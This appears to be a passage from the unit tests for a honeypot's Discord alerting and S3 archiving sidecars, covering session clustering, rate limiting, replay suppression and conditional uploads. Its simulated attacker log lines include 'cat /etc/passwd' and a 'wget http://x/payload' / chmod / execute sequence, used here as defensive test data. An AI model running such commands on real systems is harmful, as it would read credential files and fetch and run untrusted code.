"""Deterministic, offline behavioral tests for PatriotPot native sidecars."""

import hashlib
import importlib.util
import io
import json
from pathlib import Path
import stat
import sys
from types import SimpleNamespace
import unittest
from unittest import mock
import urllib.error


ROOT = Path(__file__).resolve().parents[1]


def load_script(name, filename):
    spec = importlib.util.spec_from_file_location(name, ROOT / "native" / filename)
    module = importlib.util.module_from_spec(spec)
    with mock.patch.object(sys, "argv", [filename, "--self-test"]):
        spec.loader.exec_module(module)
    return module


discord = load_script("patriotpot_discord_test", "discord-monitor.py")
archive = load_script("patriotpot_archive_test", "s3-archive.py")


class DescriptorBuffer:
    def __init__(self, data):
        self.buffer = io.BytesIO(data)

    def __enter__(self):
        return self.buffer

    def __exit__(self, *_):
        self.buffer.close()


class TransitioningDescriptorBuffer:
    def __init__(self, data, after_read):
        self.buffer = io.BytesIO(data)
        self.after_read = after_read
        self.read_count = 0

    def __enter__(self):
        return self

    def __exit__(self, *_):
        self.buffer.close()

    def seek(self, *args):
        return self.buffer.seek(*args)

    def read(self, *args):
        data = self.buffer.read(*args)
        self.read_count += 1
        self.after_read(self, self.read_count)
        return data

    def replace_data(self, data):
        position = self.buffer.tell()
        self.buffer = io.BytesIO(data)
        self.buffer.seek(min(position, len(data)))


class DiscordMonitorTests(unittest.TestCase):
    def setUp(self):
        self.credentials = mock.Mock()

    def _clusters(self):
        return discord.SessionClusterManager(window_seconds=45.0)

    def _governor(self):
        return discord.DiscordRateGovernor(clock=lambda: 0.0)

    def test_first_observation_initializes_at_eof(self):
        state = discord.default_state()
        status = SimpleNamespace(st_dev=1, st_ino=2, st_size=91)
        clusters = self._clusters()
        governor = self._governor()

        def fake_consume(path, state_arg, start, credentials, clusters_arg, governor_arg):
            state_arg["source"]["offset"] = 91
            return 91

        with mock.patch.object(discord, "regular_stat", return_value=status), mock.patch.object(
            discord, "save_state"
        ) as save, mock.patch.object(discord, "drain_pending"), mock.patch.object(
            discord, "flush_expired_clusters"
        ), mock.patch.object(
            discord, "consume", side_effect=fake_consume
        ) as consume:
            discord.poll_once(state, self.credentials, clusters, governor, None)
        consume.assert_called_once_with(discord.LOG_PATH, state, 0, self.credentials, clusters, governor)
        self.assertEqual(state["source"]["offset"], 91)
        save.assert_called_once()

    def test_restart_continues_without_replay(self):
        state = discord.default_state()
        state["source"] = {"device": 1, "inode": 2, "offset": 40}
        status = SimpleNamespace(st_dev=1, st_ino=2, st_size=80)
        clusters = self._clusters()
        governor = self._governor()
        with mock.patch.object(discord, "regular_stat", return_value=status), mock.patch.object(
            discord, "consume", return_value=80
        ) as consume, mock.patch.object(discord, "drain_pending"), mock.patch.object(
            discord, "flush_expired_clusters"
        ):
            discord.poll_once(state, self.credentials, clusters, governor, None)
        consume.assert_called_once_with(discord.LOG_PATH, state, 40, self.credentials, clusters, governor)

    def test_rename_rotation_drains_old_inode_then_new(self):
        state = discord.default_state()
        state["source"] = {"device": 1, "inode": 2, "offset": 40}
        status = SimpleNamespace(st_dev=1, st_ino=3, st_size=20)
        old_path = Path("cowrie.json.1")
        clusters = self._clusters()
        governor = self._governor()
        with mock.patch.object(discord, "regular_stat", return_value=status), mock.patch.object(
            discord, "locate_inode", return_value=old_path
        ), mock.patch.object(discord, "consume", side_effect=[45, 20]) as consume, mock.patch.object(
            discord, "save_state"
        ), mock.patch.object(discord, "drain_pending"), mock.patch.object(discord, "flush_expired_clusters"):
            discord.poll_once(state, self.credentials, clusters, governor, None)
        self.assertEqual(consume.call_args_list[0], mock.call(old_path, state, 40, self.credentials, clusters, governor))
        self.assertEqual(
            consume.call_args_list[1], mock.call(discord.LOG_PATH, state, 0, self.credentials, clusters, governor)
        )

    def test_copytruncate_resets_offset(self):
        state = discord.default_state()
        state["source"] = {"device": 1, "inode": 2, "offset": 40}
        status = SimpleNamespace(st_dev=1, st_ino=2, st_size=10)
        clusters = self._clusters()
        governor = self._governor()
        with mock.patch.object(discord, "regular_stat", return_value=status), mock.patch.object(
            discord, "consume", return_value=10
        ) as consume, mock.patch.object(discord, "save_state"), mock.patch.object(
            discord, "drain_pending"
        ), mock.patch.object(discord, "flush_expired_clusters"):
            discord.poll_once(state, self.credentials, clusters, governor, None)
        consume.assert_called_once_with(discord.LOG_PATH, state, 0, self.credentials, clusters, governor)

    def test_partial_line_is_not_consumed(self):
        state = discord.default_state()
        state["source"] = {"device": 1, "inode": 2, "offset": 0}
        raw = b'{"eventid":"complete"}\n{"eventid":"partial"'
        clusters = self._clusters()
        governor = self._governor()
        with mock.patch.object(discord.os, "open", return_value=19), mock.patch.object(
            discord.os, "fdopen", return_value=DescriptorBuffer(raw)
        ), mock.patch.object(discord, "save_state"), mock.patch.object(discord, "drain_pending"), mock.patch.object(
            discord, "queue_line"
        ) as queue:
            offset = discord.consume(Path("cowrie.json"), state, 0, self.credentials, clusters, governor)
        self.assertEqual(offset, len(b'{"eventid":"complete"}\n'))
        queue.assert_called_once()

    def test_duplicate_line_absorbed_once_into_cluster(self):
        state = discord.default_state()
        clusters = self._clusters()
        line = b'{"eventid":"cowrie.session.connect","src_ip":"198.51.100.7","session":"s1"}\n'
        discord.queue_line(state, line, clusters)
        discord.queue_line(state, line, clusters)
        self.assertEqual(state["pending"], [])
        self.assertEqual(len(state["seen"]), 1)
        self.assertEqual(clusters.active_count(), 1)

    def test_command_events_accumulate_into_cluster_not_pending(self):
        state = discord.default_state()
        clusters = self._clusters()
        line = (
            b'{"eventid":"cowrie.command.input","input":"uname -a",'
            b'"src_ip":"198.51.100.7","session":"s1"}\n'
        )
        discord.queue_line(state, line, clusters)
        # No per-event Discord payload is queued; the event is absorbed into
        # the session cluster instead, to be summarized once the cluster
        # flushes. This is the core anti-flood behavior H2 exists to add.
        self.assertEqual(state["pending"], [])
        _key, cluster, _is_new = clusters.observe(
            {"eventid": "cowrie.session.closed", "src_ip": "198.51.100.7", "session": "s1"}, now=0.0
        )
        self.assertEqual(cluster.commands, ["uname -a"])

    def test_pending_item_delivered_and_marked_seen(self):
        state = discord.default_state()
        item_id = hashlib.sha256(b"summary-1").hexdigest()
        state["pending"].append({"id": item_id, "payload": {"content": "summary"}})
        self.credentials.get.return_value = "unused-test-url"
        governor = self._governor()
        with mock.patch.object(discord, "post_payload", return_value=(True, 200, None)), mock.patch.object(
            discord, "save_state"
        ):
            discord.drain_pending(state, self.credentials, governor)
        self.assertEqual(state["pending"], [])
        self.assertEqual(state["seen"], [item_id])

    def test_restart_pending_is_suppressed_without_replay(self):
        state_path = mock.Mock()
        state_path.read_text.return_value = json.dumps(
            {
                "version": 2,
                "source": {"device": 1, "inode": 2, "offset": 20},
                "seen": [],
                "pending": [{"id": "a" * 64, "payload": {"content": "ignored"}}],
                "dead_letters": [],
                "replay_suppressed": 0,
                "initialized_at": None,
                "updated_at": None,
            }
        )
        with mock.patch.object(discord, "STATE_PATH", state_path):
            state = discord.load_state()
        self.assertEqual(state["pending"], [])
        self.assertEqual(state["replay_suppressed"], 1)
        self.assertEqual(
            state["dead_letters"],
            [{"id": "a" * 64, "reason": "restart_replay_suppressed"}],
        )

    def test_post_is_single_attempt_to_prevent_replay(self):
        with mock.patch.object(
            discord.urllib.request,
            "urlopen",
            side_effect=urllib.error.URLError("offline"),
        ) as request:
            success, status_code, retry_after = discord.post_payload(
                "https://discord.com/api/webhooks/123/test_token", {"content": "test"}
            )
        self.assertFalse(success)
        self.assertIsNone(status_code)
        self.assertIsNone(retry_after)
        self.assertEqual(request.call_count, 1)

    def test_post_returns_status_and_retry_after_on_429(self):
        error_body = json.dumps({"retry_after": 2.5}).encode()
        http_error = urllib.error.HTTPError(
            url="https://discord.com/api/webhooks/123/test_token",
            code=429,
            msg="Too Many Requests",
            hdrs={},
            fp=mock.Mock(read=mock.Mock(return_value=error_body)),
        )
        with mock.patch.object(discord.urllib.request, "urlopen", side_effect=http_error):
            success, status_code, retry_after = discord.post_payload(
                "https://discord.com/api/webhooks/123/test_token", {"content": "test"}
            )
        self.assertFalse(success)
        self.assertEqual(status_code, 429)
        self.assertEqual(retry_after, 2.5)


class DiscordH2IntegrationTests(unittest.TestCase):
    """Cluster -> enrichment -> governor -> delivery, wired end to end."""

    def setUp(self):
        self.credentials = mock.Mock()
        self.credentials.get.return_value = "unused-test-url"

    def test_post_payload_always_sets_allowed_mentions_parse_empty(self):
        """Attacker/provider text landing in an embed must never be able to
        trigger an @everyone/@here/user ping."""
        captured = {}

        def fake_urlopen(request, timeout=15):
            captured["body"] = json.loads(request.data.decode("utf-8"))
            return mock.MagicMock(__enter__=mock.Mock(return_value=mock.Mock(status=204)), __exit__=mock.Mock(return_value=False))

        with mock.patch.object(discord.urllib.request, "urlopen", side_effect=fake_urlopen):
            discord.post_payload("https://discord.com/api/webhooks/123/test_token", {"content": "@everyone hi"})
        self.assertEqual(captured["body"]["allowed_mentions"], {"parse": []})

    def test_pending_stays_bounded_during_prolonged_degraded_period(self):
        """Even while Discord is 429-ing (governor degraded, nothing draining),
        `pending` must not grow without bound -- the existing MAX_PENDING
        eviction (queue_limit dead-letter) must keep working."""
        state = discord.default_state()
        clusters = discord.SessionClusterManager(window_seconds=-1.0, max_active_clusters=100000)
        governor = discord.DiscordRateGovernor(clock=lambda: 0.0)
        governor.note_rate_limited(retry_after_seconds=99999.0)  # degraded indefinitely for this test

        with mock.patch.object(discord.time, "time", return_value=0.0):
            for i in range(discord.MAX_PENDING + 50):
                clusters.observe(
                    {"eventid": "cowrie.session.connect", "src_ip": f"198.51.{i % 250}.1", "session": f"s{i}"},
                    now=0.0,
                )
        with mock.patch.object(discord, "save_state"), mock.patch.object(discord.time, "time", return_value=100.0):
            discord.flush_expired_clusters(state, clusters, worker=None)
            discord.drain_pending(state, self.credentials, governor)  # degraded: must not send, must not grow

        self.assertLessEqual(len(state["pending"]), discord.MAX_PENDING)

    def test_429_leaves_item_pending_not_dead_lettered(self):
        state = discord.default_state()
        item_id = hashlib.sha256(b"summary-1").hexdigest()
        state["pending"].append({"id": item_id, "payload": {"content": "summary"}})
        governor = discord.DiscordRateGovernor(clock=lambda: 0.0)
        with mock.patch.object(discord, "post_payload", return_value=(False, 429, 30.0)), mock.patch.object(
            discord, "save_state"
        ):
            discord.drain_pending(state, self.credentials, governor)
        self.assertEqual(len(state["pending"]), 1)
        self.assertEqual(state["pending"][0]["id"], item_id)
        self.assertEqual(state["dead_letters"], [])
        self.assertTrue(governor.degraded)

    def test_degraded_mode_blocks_further_sends_without_dead_lettering(self):
        state = discord.default_state()
        state["pending"] = [
            {"id": hashlib.sha256(b"a").hexdigest(), "payload": {}},
            {"id": hashlib.sha256(b"b").hexdigest(), "payload": {}},
        ]
        governor = discord.DiscordRateGovernor(clock=lambda: 0.0)
        governor.note_rate_limited(retry_after_seconds=30.0)
        with mock.patch.object(discord, "post_payload") as post, mock.patch.object(discord, "save_state"):
            discord.drain_pending(state, self.credentials, governor)
        post.assert_not_called()
        self.assertEqual(len(state["pending"]), 2)
        self.assertEqual(state["dead_letters"], [])

    def test_recovery_sends_one_digest_not_a_replay_storm(self):
        state = discord.default_state()
        state["pending"] = [{"id": hashlib.sha256(b"summary").hexdigest(), "payload": {"content": "s"}}]
        governor = discord.DiscordRateGovernor(clock=lambda: 0.0)
        governor.note_rate_limited(retry_after_seconds=30.0)
        governor.note_blocked(queue_depth=50)
        # Cooldown has "elapsed" for this test by constructing a governor
        # whose clock never advances but whose cooldown we clear directly,
        # since we only care about drain_pending's reaction to success.
        governor._cooldown_until = -1.0
        with mock.patch.object(discord, "post_payload", return_value=(True, 200, None)) as post, mock.patch.object(
            discord, "save_state"
        ):
            discord.drain_pending(state, self.credentials, governor)
        # One delivery for the queued summary, one for the recovery digest --
        # never one message per suppressed item.
        self.assertEqual(post.call_count, 2)
        digest_call_payload = post.call_args_list[1][0][1]
        self.assertIn("recovered", digest_call_payload["embeds"][0]["title"].lower())
        self.assertFalse(governor.degraded)

    def test_priority_event_immediate_alert_when_enabled(self):
        state = discord.default_state()
        clusters = discord.SessionClusterManager(window_seconds=45.0)
        line = (
            b'{"eventid":"cowrie.login.success","username":"root","password":"toor",'
            b'"src_ip":"198.51.100.7","session":"s1"}\n'
        )
        with mock.patch.object(discord, "IMMEDIATE_ALERTS_ENABLED", True):
            discord.queue_line(state, line, clusters)
        self.assertEqual(len(state["pending"]), 1)
        self.assertIn("LOGIN", state["pending"][0]["payload"]["embeds"][0]["title"])

    def test_priority_event_immediate_alert_not_duplicated(self):
        state = discord.default_state()
        clusters = discord.SessionClusterManager(window_seconds=45.0)
        line = (
            b'{"eventid":"cowrie.login.success","username":"root","password":"toor",'
            b'"src_ip":"198.51.100.7","session":"s1"}\n'
        )
        other_line = (
            b'{"eventid":"cowrie.login.success","username":"root","password":"toor2",'
            b'"src_ip":"198.51.100.7","session":"s1","extra":"x"}\n'
        )
        with mock.patch.object(discord, "IMMEDIATE_ALERTS_ENABLED", True):
            discord.queue_line(state, line, clusters)
            discord.queue_line(state, other_line, clusters)
        # Same session, same priority event *kind* -> only the first one
        # produces an immediate alert.
        self.assertEqual(len(state["pending"]), 1)

    def test_no_immediate_alert_when_disabled_by_default(self):
        state = discord.default_state()
        clusters = discord.SessionClusterManager(window_seconds=45.0)
        line = (
            b'{"eventid":"cowrie.login.success","username":"root","password":"toor",'
            b'"src_ip":"198.51.100.7","session":"s1"}\n'
        )
        self.assertFalse(discord.IMMEDIATE_ALERTS_ENABLED)
        discord.queue_line(state, line, clusters)
        self.assertEqual(state["pending"], [])

    def test_many_raw_events_produce_one_flushed_summary_not_a_storm(self):
        state = discord.default_state()
        clusters = discord.SessionClusterManager(window_seconds=45.0)
        events = [
            b'{"eventid":"cowrie.session.connect","src_ip":"198.51.100.7","session":"s1"}\n',
            b'{"eventid":"cowrie.login.success","username":"root","password":"admin","src_ip":"198.51.100.7","session":"s1"}\n',
            b'{"eventid":"cowrie.command.input","input":"uname -a","src_ip":"198.51.100.7","session":"s1"}\n',
            b'{"eventid":"cowrie.command.input","input":"id","src_ip":"198.51.100.7","session":"s1"}\n',
            b'{"eventid":"cowrie.command.input","input":"cat /etc/passwd","src_ip":"198.51.100.7","session":"s1"}\n',
            b'{"eventid":"cowrie.command.input","input":"wget http://x/payload","src_ip":"198.51.100.7","session":"s1"}\n',
            b'{"eventid":"cowrie.command.input","input":"chmod +x payload","src_ip":"198.51.100.7","session":"s1"}\n',
            b'{"eventid":"cowrie.command.input","input":"./payload","src_ip":"198.51.100.7","session":"s1"}\n',
        ]
        with mock.patch.object(discord.time, "time", return_value=0.0):
            for line in events:
                discord.queue_line(state, line, clusters)
        self.assertEqual(state["pending"], [])  # nothing sent yet: cluster still open
        with mock.patch.object(discord, "save_state"), mock.patch.object(
            discord.time, "time", return_value=10_000.0
        ):
            discord.flush_expired_clusters(state, clusters, worker=None)
        self.assertEqual(len(state["pending"]), 1)
        embed = state["pending"][0]["payload"]["embeds"][0]
        self.assertIn("ATTACK SESSION SUMMARY", embed["title"])

    def test_flush_expired_clusters_fail_open_with_no_worker_configured(self):
        state = discord.default_state()
        clusters = discord.SessionClusterManager(window_seconds=-1.0)
        clusters.observe({"eventid": "cowrie.session.connect", "src_ip": "198.51.100.7", "session": "s1"}, now=0.0)
        with mock.patch.object(discord, "save_state"):
            discord.flush_expired_clusters(state, clusters, worker=None)
        self.assertEqual(len(state["pending"]), 1)
        self.assertEqual(state["flushed_awaiting_enrichment"], {})

    def test_flush_expired_clusters_fail_open_when_worker_backlog_full(self):
        state = discord.default_state()
        clusters = discord.SessionClusterManager(window_seconds=-1.0)
        clusters.observe({"eventid": "cowrie.session.connect", "src_ip": "198.51.100.7", "session": "s1"}, now=0.0)
        worker = mock.Mock()
        worker.try_submit.return_value = False  # backlog full
        worker.drain_completed.return_value = []
        with mock.patch.object(discord, "save_state"):
            discord.flush_expired_clusters(state, clusters, worker)
        self.assertEqual(len(state["pending"]), 1)
        self.assertEqual(state["flushed_awaiting_enrichment"], {})

    def test_restart_safe_state_no_replay_after_load(self):
        state = discord.default_state()
        clusters = discord.SessionClusterManager(window_seconds=45.0)
        line = b'{"eventid":"cowrie.command.input","input":"ls","src_ip":"198.51.100.7","session":"s1"}\n'
        discord.queue_line(state, line, clusters)
        digest = hashlib.sha256(line).hexdigest()
        self.assertIn(digest, state["seen"])
        # Simulate a restart: a fresh cluster manager restored from the
        # persisted `state["clusters"]` blob, fed the same line again (as a
        # crash-before-offset-advance replay would). The line dedupes via
        # `seen` (unchanged from before H2) and the restored cluster's
        # command data is intact from before the "restart".
        fresh_clusters = discord.SessionClusterManager(window_seconds=45.0)
        fresh_clusters.restore_state(state["clusters"])
        discord.queue_line(state, line, fresh_clusters)
        self.assertEqual(fresh_clusters.active_count(), 1)
        self.assertEqual(len(state["seen"]), 1)
        _key, cluster, _is_new = fresh_clusters.observe(
            {"eventid": "cowrie.session.closed", "src_ip": "198.51.100.7", "session": "s1"}, now=1.0
        )
        self.assertEqual(cluster.commands, ["ls"])  # survived the "restart"

    # ---- Blocker 2 lifecycle proofs: event accepted -> cluster persisted -> offset persisted ----

    def test_atomic_save_never_observes_offset_ahead_of_cluster_data(self):
        """Every save_state() call during consume() must show the cluster
        mutation for a line already present whenever that line's offset is
        present -- proving there is no window where a crash could persist
        one without the other."""
        state = discord.default_state()
        state["source"] = {"device": 1, "inode": 2, "offset": 0}
        clusters = discord.SessionClusterManager(window_seconds=45.0)
        governor = discord.DiscordRateGovernor(clock=lambda: 0.0)
        raw = (
            b'{"eventid":"cowrie.command.input","input":"one","src_ip":"198.51.100.7","session":"s1"}\n'
            b'{"eventid":"cowrie.command.input","input":"two","src_ip":"198.51.100.7","session":"s1"}\n'
        )
        snapshots = []

        def capturing_save_state(state_arg):
            snapshots.append(
                (state_arg["source"]["offset"], len(state_arg["clusters"].get("session:s1", {}).get("commands", [])))
            )

        with mock.patch.object(discord.os, "open", return_value=19), mock.patch.object(
            discord.os, "fdopen", return_value=DescriptorBuffer(raw)
        ), mock.patch.object(discord, "save_state", side_effect=capturing_save_state), mock.patch.object(
            discord, "drain_pending"
        ):
            discord.consume(Path("cowrie.json"), state, 0, self.credentials, clusters, governor)
        self.assertEqual(len(snapshots), 2)
        offset_after_first, commands_after_first = snapshots[0]
        self.assertGreater(offset_after_first, 0)
        self.assertEqual(commands_after_first, 1)  # cluster already reflects "one" in the SAME save as its offset
        _offset_after_second, commands_after_second = snapshots[1]
        self.assertEqual(commands_after_second, 2)

    def test_crash_before_flush_restores_and_flushes_normally_after_restart(self):
        state = discord.default_state()
        clusters = discord.SessionClusterManager(window_seconds=45.0)
        with mock.patch.object(discord.time, "time", return_value=0.0):
            discord.queue_line(
                state,
                b'{"eventid":"cowrie.login.success","username":"root","password":"toor","src_ip":"198.51.100.7","session":"s1"}\n',
                clusters,
            )
            discord.queue_line(
                state,
                b'{"eventid":"cowrie.command.input","input":"whoami","src_ip":"198.51.100.7","session":"s1"}\n',
                clusters,
            )
        # "Crash": nothing was flushed yet. state["clusters"] is the only
        # record of this session; the in-memory `clusters` manager is
        # discarded, simulating process death.
        self.assertEqual(state["pending"], [])
        self.assertNotEqual(state["clusters"], {})

        # "Restart": a fresh manager restored purely from persisted state.
        restarted_clusters = discord.SessionClusterManager(window_seconds=45.0)
        restarted_clusters.restore_state(state["clusters"])
        self.assertEqual(restarted_clusters.active_count(), 1)

        with mock.patch.object(discord, "save_state"), mock.patch.object(discord.time, "time", return_value=1000.0):
            discord.flush_expired_clusters(state, restarted_clusters, worker=None)
        self.assertEqual(len(state["pending"]), 1)
        embed = state["pending"][0]["payload"]["embeds"][0]
        self.assertIn("Successful login", embed["fields"][0]["value"])

    def test_crash_during_enrichment_window_recovered_at_startup(self):
        """Simulates a crash after a cluster was flushed and submitted for
        background enrichment, but before the worker's result came back."""
        state = discord.default_state()
        clusters = discord.SessionClusterManager(window_seconds=-1.0)
        clusters.observe({"eventid": "cowrie.command.input", "input": "id", "src_ip": "198.51.100.7", "session": "s1"}, now=0.0)
        with mock.patch.object(discord, "save_state"):
            discord.flush_expired_clusters(state, clusters, worker=None)
        # Re-seed as if worker enrichment was still in flight at crash time:
        # move the just-built pending summary back out and reconstruct the
        # awaiting-enrichment entry that would exist at that exact moment.
        flushed_entry = next(iter(state["flushed_awaiting_enrichment"].values()), None)
        state["pending"] = []
        if flushed_entry is None:
            cluster = discord.SessionCluster(key="session:s1", src_ip="198.51.100.7", session_id="s1", created_at=0.0)
            cluster.commands = ["id"]
            cluster.raw_event_count = 1
            state["flushed_awaiting_enrichment"] = {"deadbeef": cluster.to_dict()}

        with mock.patch.object(discord, "save_state"):
            discord._recover_flushed_awaiting_enrichment(state)
        self.assertEqual(len(state["pending"]), 1)
        self.assertEqual(state["flushed_awaiting_enrichment"], {})

    def test_recovered_summary_is_not_replayed_a_second_time(self):
        """Once a flushed-awaiting-enrichment entry is recovered into
        `pending`, a second restart before delivery must dead-letter it
        (existing pending-suppression logic), never resend it."""
        cluster = discord.SessionCluster(key="session:s1", src_ip="198.51.100.7", session_id="s1", created_at=0.0)
        cluster.commands = ["id"]
        cluster.raw_event_count = 1
        state = discord.default_state()
        state["flushed_awaiting_enrichment"] = {"deadbeef": cluster.to_dict()}
        with mock.patch.object(discord, "save_state"):
            discord._recover_flushed_awaiting_enrichment(state)
        self.assertEqual(len(state["pending"]), 1)

        # Second "restart": load_state()'s own pending-suppression logic
        # (unchanged by H2) must dead-letter it, not resend it.
        state_path = mock.Mock()
        state_path.read_text.return_value = json.dumps(state)
        with mock.patch.object(discord, "STATE_PATH", state_path):
            reloaded = discord.load_state()
        self.assertEqual(reloaded["pending"], [])
        self.assertEqual(reloaded["replay_suppressed"], 1)
        self.assertEqual(reloaded["dead_letters"][0]["reason"], "restart_replay_suppressed")

    def test_evicted_overflow_clusters_are_still_flushed_not_dropped(self):
        state = discord.default_state()
        clusters = discord.SessionClusterManager(window_seconds=45.0, max_active_clusters=2)
        with mock.patch.object(discord.time, "time", side_effect=[0.0, 1.0, 2.0, 2.0, 2.0]):
            discord.queue_line(state, b'{"eventid":"cowrie.session.connect","src_ip":"198.51.100.1","session":"s1"}\n', clusters)
            discord.queue_line(state, b'{"eventid":"cowrie.session.connect","src_ip":"198.51.100.2","session":"s2"}\n', clusters)
            discord.queue_line(state, b'{"eventid":"cowrie.session.connect","src_ip":"198.51.100.3","session":"s3"}\n', clusters)
        # Third cluster pushed the manager over its bound; the oldest must
        # be evicted and flushed (as a pending summary), not silently lost.
        with mock.patch.object(discord, "save_state"), mock.patch.object(discord.time, "time", return_value=2.0):
            discord.flush_expired_clusters(state, clusters, worker=None)
        self.assertEqual(len(state["pending"]), 1)
        self.assertEqual(clusters.active_count(), 2)

    def test_offset_consumption_proceeds_while_enrichment_is_slow_and_in_flight(self):
        """Integration-level Blocker 3 proof: with a real ThreatIntelWorker
        backed by a deliberately slow broker, flush_expired_clusters()
        (called from poll_once, same as production) must return quickly and
        consume()'s own offset advancement on a subsequent line must not
        wait for enrichment to complete."""
        import threading
        import time as real_time

        from threat_intel.worker import ThreatIntelWorker

        release = threading.Event()
        broker = mock.Mock()
        broker.enrich_ip.side_effect = lambda ip: (release.wait(5.0), {})[1]
        worker = ThreatIntelWorker(broker, max_workers=4, max_inflight=500)
        try:
            state = discord.default_state()
            clusters = discord.SessionClusterManager(window_seconds=45.0, max_active_clusters=1000)
            with mock.patch.object(discord.time, "time", side_effect=lambda: real_time.monotonic()):
                for i in range(200):
                    discord.queue_line(
                        state,
                        f'{{"eventid":"cowrie.session.connect","src_ip":"198.51.100.{i % 250}","session":"s{i}"}}\n'.encode(),
                        clusters,
                    )

            started = real_time.monotonic()
            with mock.patch.object(discord, "save_state"), mock.patch.object(
                discord.time, "time", return_value=real_time.monotonic() + 10_000.0
            ):
                discord.flush_expired_clusters(state, clusters, worker)
            flush_elapsed = real_time.monotonic() - started
            # 200 clusters submitted for enrichment that each sleep up to 5s;
            # flush_expired_clusters must not itself sleep -- it only submits
            # (non-blocking) and drains already-completed results (none yet).
            self.assertLess(flush_elapsed, 1.0)

            # consume()'s offset advancement must proceed immediately too,
            # independent of the 200 in-flight enrichments.
            state2 = discord.default_state()
            state2["source"] = {"device": 1, "inode": 2, "offset": 0}
            governor = discord.DiscordRateGovernor(clock=lambda: 0.0)
            raw = b'{"eventid":"cowrie.session.connect","src_ip":"198.51.100.1","session":"zzz"}\n'
            consume_started = real_time.monotonic()
            with mock.patch.object(discord.os, "open", return_value=19), mock.patch.object(
                discord.os, "fdopen", return_value=DescriptorBuffer(raw)
            ), mock.patch.object(discord, "save_state"), mock.patch.object(discord, "drain_pending"):
                offset = discord.consume(Path("cowrie.json"), state2, 0, self.credentials, discord.SessionClusterManager(), governor)
            consume_elapsed = real_time.monotonic() - consume_started
            self.assertEqual(offset, len(raw))
            self.assertLess(consume_elapsed, 0.5)
        finally:
            release.set()
            worker.shutdown()


class ArchiveTests(unittest.TestCase):
    def status(self, size, device=7, inode=9):
        return SimpleNamespace(
            st_dev=device,
            st_ino=inode,
            st_size=size,
            st_mode=stat.S_IFREG | 0o640,
        )

    def s3_error(self, code, status, operation="PutObject"):
        return archive.ClientError(
            {
                "Error": {"Code": code, "Message": code},
                "ResponseMetadata": {"HTTPStatusCode": status},
            },
            operation,
        )

    def object_key(self, data=b'{"eventid":"test"}\n'):
        digest = hashlib.sha256(data).hexdigest()
        return data, digest, f"control/production/sensors/control-0/instances/i-test/segments/7-9-g000000/00000000000000000000-00000000000000000019-{digest}.json"

    def get_response(self, data, digest, version="v1"):
        return {
            "Body": io.BytesIO(data),
            "VersionId": version,
            "ETag": '"etag"',
            "ChecksumSHA256": archive.checksum_b64(digest),
        }

    def run_put(self, client, data, digest, key):
        with mock.patch.object(archive, "s3_client", return_value=client), mock.patch.object(
            Path, "open", side_effect=lambda *_args, **_kwargs: io.BytesIO(data)
        ):
            return archive.put_once(
                Path("segment"),
                key,
                digest,
                "application/x-ndjson",
            )

    def test_conditional_success_uses_header_checksum_and_exact_version_get(self):
        data, digest, key = self.object_key()
        client = mock.Mock()
        client.put_object.return_value = {
            "VersionId": "v1",
            "ETag": '"etag"',
            "ChecksumSHA256": archive.checksum_b64(digest),
        }
        client.get_object.return_value = self.get_response(data, digest)
        result = self.run_put(client, data, digest, key)
        self.assertFalse(result["Existing"])
        self.assertEqual(result["VersionId"], "v1")
        put = client.put_object.call_args.kwargs
        self.assertEqual(put["IfNoneMatch"], "*")
        self.assertEqual(put["ChecksumSHA256"], archive.checksum_b64(digest))
        self.assertEqual(put["Metadata"], {"sha256": digest})
        get = client.get_object.call_args.kwargs
        self.assertEqual(get["VersionId"], "v1")
        self.assertEqual(get["ChecksumMode"], "ENABLED")

    def test_precondition_gets_current_body_and_records_version(self):
        data, digest, key = self.object_key()
        client = mock.Mock()
        client.put_object.side_effect = self.s3_error("PreconditionFailed", 412)
        client.get_object.return_value = self.get_response(data, digest, "existing-v1")
        result = self.run_put(client, data, digest, key)
        self.assertTrue(result["Existing"])
        self.assertEqual(result["VersionId"], "existing-v1")
        self.assertNotIn("VersionId", client.get_object.call_args.kwargs)

    def test_lost_response_then_412_has_one_version_equivalence(self):
        data, digest, key = self.object_key()
        versions = []
        client = mock.Mock()

        def conditional_put(**arguments):
            self.assertEqual(arguments["IfNoneMatch"], "*")
            if not versions:
                versions.append("v1")
                raise archive.EndpointConnectionError(endpoint_url="https://s3.test")
            raise self.s3_error("PreconditionFailed", 412)

        client.put_object.side_effect = conditional_put
        client.get_object.return_value = self.get_response(data, digest, "v1")
        with mock.patch.object(archive.time, "sleep"):
            result = self.run_put(client, data, digest, key)
        self.assertTrue(result["Existing"])
        self.assertEqual(result["VersionId"], "v1")
        self.assertEqual(versions, ["v1"])
        self.assertEqual(client.put_object.call_count, 2)

    def test_409_retry_is_bounded_then_success(self):
        data, digest, key = self.object_key()
        client = mock.Mock()
        client.put_object.side_effect = [
            self.s3_error("ConditionalRequestConflict", 409),
            {
                "VersionId": "v1",
                "ChecksumSHA256": archive.checksum_b64(digest),
            },
        ]
        client.get_object.return_value = self.get_response(data, digest)
        with mock.patch.object(archive.time, "sleep") as sleep:
            result = self.run_put(client, data, digest, key)
        self.assertFalse(result["Existing"])
        self.assertEqual(client.put_object.call_count, 2)
        sleep.assert_called_once()

    def test_409_retry_exhaustion_fails_closed(self):
        data, digest, key = self.object_key()
        client = mock.Mock()
        client.put_object.side_effect = self.s3_error(
            "ConditionalRequestConflict", 409
        )
        with mock.patch.object(archive.time, "sleep"), self.assertRaises(
            archive.S3TransientError
        ):
            self.run_put(client, data, digest, key)
        self.assertEqual(client.put_object.call_count, archive.MAX_PUT_ATTEMPTS)
        client.get_object.assert_not_called()

    def test_success_without_version_fails_before_get(self):
        data, digest, key = self.object_key()
        client = mock.Mock()
        client.put_object.return_value = {"ETag": '"etag"'}
        with self.assertRaisesRegex(RuntimeError, "omitted required version"):
            self.run_put(client, data, digest, key)
        client.get_object.assert_not_called()

    def test_transient_put_retries_same_condition_and_fails_closed(self):
        data, digest, key = self.object_key()
        client = mock.Mock()
        client.put_object.side_effect = self.s3_error("SlowDown", 503)
        with mock.patch.object(archive.time, "sleep") as sleep, self.assertRaises(
            archive.S3TransientError
        ):
            self.run_put(client, data, digest, key)
        self.assertEqual(client.put_object.call_count, archive.MAX_PUT_ATTEMPTS)
        self.assertEqual(sleep.call_count, archive.MAX_PUT_ATTEMPTS - 1)
        self.assertTrue(
            all(call.kwargs["IfNoneMatch"] == "*" for call in client.put_object.call_args_list)
        )
        client.get_object.assert_not_called()

    def test_body_digest_mismatch_fails_closed_despite_matching_metadata(self):
        data, digest, key = self.object_key()
        client = mock.Mock()
        client.put_object.return_value = {"VersionId": "v1"}
        client.get_object.return_value = {
            "Body": io.BytesIO(b"tampered\n"),
